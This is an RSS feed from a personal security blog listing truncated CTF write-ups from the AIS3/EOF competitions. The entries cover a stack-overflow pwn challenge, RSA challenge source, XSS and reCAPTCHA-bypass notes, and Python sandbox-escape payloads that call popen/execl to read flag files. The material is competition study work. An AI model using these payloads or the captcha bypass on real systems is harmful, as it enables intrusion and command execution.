<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>AIS3 on SBK Hugo Site</title><link>https://bernie6401.github.io/tags/ais3/</link><description>Recent content in AIS3 on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/ais3/index.xml" rel="self" type="application/rss+xml"/><item><title>AIS3 EOF 2023 初賽</title><link>https://bernie6401.github.io/docs/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/</guid><description>&lt;h1 id="ais3-eof-2023-初賽">
 AIS3 EOF 2023 初賽
 &lt;a class="anchor" href="#ais3-eof-2023-%e5%88%9d%e8%b3%bd">#&lt;/a>
&lt;/h1>
&lt;h2 id="pwn">
 PWN
 &lt;a class="anchor" href="#pwn">#&lt;/a>
&lt;/h2>
&lt;h3 id="real_rop">
 real_rop
 &lt;a class="anchor" href="#real_rop">#&lt;/a>
&lt;/h3>
&lt;h4 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>Challenge &lt;a href="https://share.ctf.zoolab.org/">URL&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Folder structure:&lt;/p>
&lt;pre tabindex="0">&lt;code>Share
├── share
│ ├── chal
│ ├── flag
│ ├── Makefile
│ ├── real_rop++.c
│ └── run.sh
├── docker-compose.yaml
├── Dockerfile
└── xinetd
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h4 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h4>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;unistd.h&amp;gt;

int main()
{
 char buf[0x10];

 read(0, buf, 0x30);
 write(1, buf, 0x30);
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-make!" data-lang="make!">gcc -fno-stack-protector -o chal real_rop++.c
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Obviously buffer overflow but not much&lt;/li>
&lt;li>Preliminary idea is &lt;code>one_gadget&lt;/code>&lt;/li>
&lt;li>Check protector
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ checksec chal
[*] &amp;#39;/home/sbk6401/CTF/AIS3/PWN/real_rop/share/chal&amp;#39;
 Arch: amd64-64-little
 RELRO: Full RELRO
 Stack: No canary found
 NX: NX enabled
 PIE: PIE enabled
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;code>PIE&lt;/code> is enabled → use write function to leak &lt;code>libc&lt;/code> address&lt;/li>
&lt;li>&lt;code>Full RELRO&lt;/code> → cannot use &lt;code>GOT hijacking&lt;/code>&lt;/li>
&lt;li>Refer to &lt;a href="https://hackmd.io/Prmz9YuOQsiHGXrTuYMzFw?view#Real_rop">大神write up&lt;/a>, we cannot leak &lt;code>libc&lt;/code> address and get shell at one time. So, we can control &lt;code>$rip&lt;/code> and return to the beginning of &lt;code>main&lt;/code> function and go through the process again. That is, &lt;font color="FF0000">we have another &lt;code>read&lt;/code> function&lt;/font> to fill in &lt;code>one_gadget&lt;/code>.&lt;/li>
&lt;li>Note that, &lt;strong>the version of Ubuntu and Glibc is VERY VERY important&lt;/strong>, according to &lt;code>Dockerfile&lt;/code>, it seems use Ubuntu 20.04 with default
&lt;pre tabindex="0">&lt;code class="language-dockerfile!" data-lang="dockerfile!">FROM ubuntu:20.04
MAINTAINER u1f383

RUN apt-get update &amp;amp;&amp;amp; \
 DEBAIN_FRONTEND=noninteractive apt-get install -qy xinetd

RUN useradd -m chal
RUN chown -R root:root /home/chal
RUN chmod -R 755 /home/chal

CMD [&amp;#34;/usr/sbin/xinetd&amp;#34;, &amp;#34;-dontfork&amp;#34;]
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h4 id="analyze-where-to-return">
 Analyze where to return
 &lt;a class="anchor" href="#analyze-where-to-return">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>&lt;font color="FF0000">&lt;strong>&lt;code>For Ubuntu 22.04 &amp;amp;　GLIBC 2.35&lt;/code> - back to &lt;code>__libc_start_main+121&lt;/code>&lt;/strong>&lt;/font>&lt;/p></description></item><item><title>AIS3 EOF 2024</title><link>https://bernie6401.github.io/docs/security/competition/ais3-eof-2024/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/ais3-eof-2024/</guid><description>&lt;h1 id="ais3-eof-2024">
 AIS3 EOF 2024
 &lt;a class="anchor" href="#ais3-eof-2024">#&lt;/a>
&lt;/h1>
&lt;p>&lt;img src="https://hackmd.io/_uploads/BkNtOJddp.png" alt="圖片" />&lt;/p>
&lt;h2 id="crypto">
 Crypto
 &lt;a class="anchor" href="#crypto">#&lt;/a>
&lt;/h2>
&lt;h3 id="baby-rsa">
 Baby RSA
 &lt;a class="anchor" href="#baby-rsa">#&lt;/a>
&lt;/h3>
&lt;h4 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h4>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#! /usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> bytes_to_long, long_to_bytes, getPrime
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">encrypt&lt;/span>(m, e, n):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> enc &lt;span style="color:#f92672">=&lt;/span> pow(bytes_to_long(m), e, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> enc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">decrypt&lt;/span>(c, d, n):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dec &lt;span style="color:#f92672">=&lt;/span> pow(c, d, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> long_to_bytes(dec)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> q &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> n &lt;span style="color:#f92672">=&lt;/span> p &lt;span style="color:#f92672">*&lt;/span> q
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> phi &lt;span style="color:#f92672">=&lt;/span> (p &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> (q &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> e &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> phi &lt;span style="color:#f92672">%&lt;/span> e &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> : 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> d &lt;span style="color:#f92672">=&lt;/span> pow(e, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, phi)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>p&lt;span style="color:#e6db74">=}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>q&lt;span style="color:#e6db74">=}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>n&lt;span style="color:#e6db74">=}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>e&lt;span style="color:#e6db74">=}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;FLAG: &amp;#34;&lt;/span>, encrypt(FLAG, e, n))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">3&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c &lt;span style="color:#f92672">=&lt;/span> int(input(&lt;span style="color:#e6db74">&amp;#34;Any message for me?&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> m &lt;span style="color:#f92672">=&lt;/span> decrypt(c, d, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;How beautiful the message is, it makes me want to destroy it .w.&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> new_m &lt;span style="color:#f92672">=&lt;/span> long_to_bytes(bytes_to_long(m) &lt;span style="color:#f92672">^&lt;/span> bytes_to_long(os&lt;span style="color:#f92672">.&lt;/span>urandom(&lt;span style="color:#ae81ff">8&lt;/span>)))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print( &lt;span style="color:#e6db74">&amp;#34;New Message: &amp;#34;&lt;/span>, encrypt(new_m, e, n) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;?&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>AIS3 Pre-Exam 2023</title><link>https://bernie6401.github.io/docs/security/competition/ais3-pre-exam-2023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/ais3-pre-exam-2023/</guid><description>&lt;h1 id="ais3-pre-exam-2023">
 AIS3 Pre-Exam 2023
 &lt;a class="anchor" href="#ais3-pre-exam-2023">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-eof2023">
 tags: &lt;code>CTF&lt;/code> &lt;code>EOF2023&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-eof2023">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="web">
 Web
 &lt;a class="anchor" href="#web">#&lt;/a>
&lt;/h2>
&lt;h3 id="e-portfolio-baby">
 E-Portfolio baby
 &lt;a class="anchor" href="#e-portfolio-baby">#&lt;/a>
&lt;/h3>
&lt;h4 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h4>
&lt;p>直接用Burp Suite可以繞過reCAPTCHA，而且About Guest的內容會被完整的render出來達到XSS&lt;/p>
&lt;h3 id="login-panel">
 Login Panel
 &lt;a class="anchor" href="#login-panel">#&lt;/a>
&lt;/h3>
&lt;h4 id="recon-1">
 Recon
 &lt;a class="anchor" href="#recon-1">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>&lt;a href="https://www.readfog.com/a/1640970212456108032">我又找到了一個破解谷歌驗證碼的新方案！&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://yescaptcha.com/dashboard.html">yescaptcha&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="reverse">
 Reverse
 &lt;a class="anchor" href="#reverse">#&lt;/a>
&lt;/h2>
&lt;h2 id="pwn">
 Pwn
 &lt;a class="anchor" href="#pwn">#&lt;/a>
&lt;/h2>
&lt;h3 id="simply-pwn">
 Simply Pwn
 &lt;a class="anchor" href="#simply-pwn">#&lt;/a>
&lt;/h3>
&lt;h4 id="recon-2">
 Recon
 &lt;a class="anchor" href="#recon-2">#&lt;/a>
&lt;/h4>
&lt;ol>
&lt;li>&lt;code>checksec&lt;/code>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ checksec pwn
[*] Checking for new versions of pwntools
 To disable this functionality, set the contents of /home/sbk6401/.cache/.pwntools-cache-3.7/update to &amp;#39;never&amp;#39; (old way).
 Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
 [update]
 interval=never
[*] You have the latest version of Pwntools (4.9.0)
[*] &amp;#39;/home/sbk6401/CTF/AIS3-Pre-Exam/PWN/Simply Pwn/pwn&amp;#39;
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX disabled
 PIE: No PIE (0x400000)
 RWX: Has RWX segments
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;h2 id="misc">
 Misc
 &lt;a class="anchor" href="#misc">#&lt;/a>
&lt;/h2>
&lt;h3 id="welcome">
 Welcome
 &lt;a class="anchor" href="#welcome">#&lt;/a>
&lt;/h3>
&lt;p>縮小檔案就看的到flag了
Flag: &lt;code>AIS3{WELCOME-TO-2023-PRE-EXAM-&amp;amp;-MY-FIRST-CTF}&lt;/code>&lt;/p></description></item><item><title>EOF AIS3 Final</title><link>https://bernie6401.github.io/docs/security/competition/eof-ais3-final/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/eof-ais3-final/</guid><description>&lt;h1 id="eof-ais3-final">
 EOF AIS3 Final
 &lt;a class="anchor" href="#eof-ais3-final">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-ais3">
 tags: &lt;code>CTF&lt;/code> &lt;code>AIS3&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-ais3">#&lt;/a>
&lt;/h6>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/">https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html">https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md">https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md&lt;/a>&lt;/p>
&lt;p>SSTI: &lt;a href="https://www.freebuf.com/articles/network/258136.html">https://www.freebuf.com/articles/network/258136.html&lt;/a>
&lt;a href="https://www.compart.com/en/unicode/U&amp;#43;FF5B">https://www.compart.com/en/unicode/U+FF5B&lt;/a>
&lt;a href="https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection">https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection&lt;/a>&lt;/p>
&lt;p>Payload:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, &amp;#34;./flag.txt&amp;#34;))


print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;popen&amp;#39;](&amp;#34;cat /flag.txt&amp;#34;))

file = &amp;#39;FLAG.TXT&amp;#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower()))

file = &amp;#39;FLAG.TXT&amp;#39;
command = &amp;#39;EXECL&amp;#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[command.lower()](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower()))


file = &amp;#39;FLAG.TXT&amp;#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;spawnl&amp;#39;](&amp;#39;P_WAIT&amp;#39;, &amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower()))
&lt;/code>&lt;/pre>&lt;h2 id="script---run_scriptpy">
 Script - run_script.py
 &lt;a class="anchor" href="#script---run_scriptpy">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import subprocess
import time
import multiprocessing as mp


def cycle(i):
 subprocess.call([&amp;#39;python&amp;#39;, &amp;#39;script.py&amp;#39;, &amp;#39;--team&amp;#39;, str(i)])

if __name__ == &amp;#34;__main__&amp;#34;:
 p1 = mp.Process(target=cycle, args=(&amp;#39;1&amp;#39;,))
 p2 = mp.Process(target=cycle, args=(&amp;#39;2&amp;#39;,))
 # p3 = mp.Process(target=cycle, args=(&amp;#39;3&amp;#39;,))
 # p4 = mp.Process(target=cycle, args=(&amp;#39;4&amp;#39;,))
 # p5 = mp.Process(target=cycle, args=(&amp;#39;5&amp;#39;,))
 # p7 = mp.Process(target=cycle, args=(&amp;#39;7&amp;#39;,))
 # p8 = mp.Process(target=cycle, args=(&amp;#39;8&amp;#39;,))
 # p9 = mp.Process(target=cycle, args=(&amp;#39;9&amp;#39;,))
 # p10 = mp.Process(target=cycle, args=(&amp;#39;10&amp;#39;,))
 # p11 = mp.Process(target=cycle, args=(&amp;#39;11&amp;#39;,))
 # p12 = mp.Process(target=cycle, args=(&amp;#39;12&amp;#39;,))
 # p13 = mp.Process(target=cycle, args=(&amp;#39;13&amp;#39;,))
 # p14 = mp.Process(target=cycle, args=(&amp;#39;14&amp;#39;,))
 # p15 = mp.Process(target=cycle, args=(&amp;#39;15&amp;#39;,))
 # p16 = mp.Process(target=cycle, args=(&amp;#39;16&amp;#39;,))
 # p17 = mp.Process(target=cycle, args=(&amp;#39;17&amp;#39;,))
 # p18 = mp.Process(target=cycle, args=(&amp;#39;18&amp;#39;,))
 # p19 = mp.Process(target=cycle, args=(&amp;#39;19&amp;#39;,))
 # p20 = mp.Process(target=cycle, args=(&amp;#39;20&amp;#39;,))
 # p21 = mp.Process(target=cycle, args=(&amp;#39;21&amp;#39;,))
 # p22 = mp.Process(target=cycle, args=(&amp;#39;22&amp;#39;,))
 # p23 = mp.Process(target=cycle, args=(&amp;#39;23&amp;#39;,))
 # p24 = mp.Process(target=cycle, args=(&amp;#39;24&amp;#39;,))
 

 p1.start()
 time.sleep(2)
 p2.start()
 time.sleep(2)
 # p3.start()
 # p4.start()
 # p5.start()
 # p7.start()
 # p8.start()
 # p9.start()
 # p10.start()
 # p11.start()
 # p12.start()
 # p13.start()
 # p14.start()
 # p15.start()
 # p16.start()
 # p17.start()
 # p18.start()
 # p19.start()
 # p20.start()
 # p21.start()
 # p22.start()
 # p23.start()
 # p24.start()

 p1.join()
 p2.join()
 # p3.join()
 # p4.join()
 # p5.join()
 # p7.join()
 # p8.join()
 # p9.join()
 # p10.join()
 # p11.join()
 # p12.join()
 # p13.join()
 # p14.join()
 # p15.join()
 # p16.join()
 # p17.join()
 # p18.join()
 # p19.join()
 # p20.join()
 # p21.join()
 # p22.join()
 # p23.join()
 # p24.join()
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item></channel></rss>